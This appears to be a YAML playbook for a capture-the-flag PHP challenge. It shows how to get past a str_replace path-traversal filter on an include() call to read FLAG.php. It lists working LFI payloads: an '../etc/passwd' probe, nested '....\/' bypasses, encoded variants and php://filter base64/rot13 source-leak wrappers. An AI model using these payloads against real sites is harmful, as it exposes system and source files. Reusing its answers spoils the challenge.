name: php_lfi_filter_bypass
category: web
tags: [lfi, php, filter_bypass, path_traversal]
indicators:
  - "str_replace() filtering path traversal"
  - "include() with user input"
  - "Filter removes '../', './', '..\\', '.\\'"
  - "Flag in /FLAG.php"

tricks:
  - name: "Step 1: Identify LFI vulnerability"
    when: "Found include() with filtered user input"
    how: "Check if path traversal is filtered"
    payload: |
      # Test basic path traversal
      ?id=../etc/passwd
      # If filtered, try bypass

  - name: "Step 2: Bypass str_replace filter"
    when: "Filter removes '../', './', '..\\', '.\\'"
    how: "Use nested path traversal"
    payload: |
      # str_replace(['../', './', '..\\', '.\\'], '', $post_id)
      # Use ....\/ where .\ gets removed, leaving ../
      ?id=....\/....\/....\/....\/FLAG.php
      # After filter: ../../../../FLAG.php

  - name: "Step 3: Alternative bypass methods"
    when: "First bypass doesn't work"
    how: "Try different encoding or combinations"
    payload: |
      # Double encoding
      ?id=....%2F....%2F....%2F....%2FFLAG.php
      
      # Mixed separators
      ?id=....\/..\/....\/FLAG.php
      
      # With php://filter wrapper
      ?id=php://filter/read=string.rot13/resource=....\/....\/....\/....\/FLAG.php

  - name: "Step 4: Extract flag from PHP execution"
    when: "LFI successful but flag in PHP variable"
    how: "Use php://filter to read source or execute"
    payload: |
      # Read source code
      ?id=php://filter/convert.base64-encode/resource=....\/....\/....\/....\/FLAG.php
      # Decode base64 to get PHP source with flag

